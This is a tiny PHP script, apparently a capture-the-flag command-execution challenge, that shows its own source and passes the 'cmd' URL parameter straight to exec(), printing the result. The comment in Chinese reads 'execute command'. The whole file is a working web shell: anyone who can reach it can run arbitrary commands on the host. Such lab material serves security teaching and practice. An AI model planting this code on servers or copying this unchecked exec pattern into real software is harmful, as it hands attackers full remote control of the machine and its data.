<?php
highlight_file(__FILE__);
$cmd = $_GET["cmd"];
exec($cmd,$array); //执行命令
print_r($array);
?>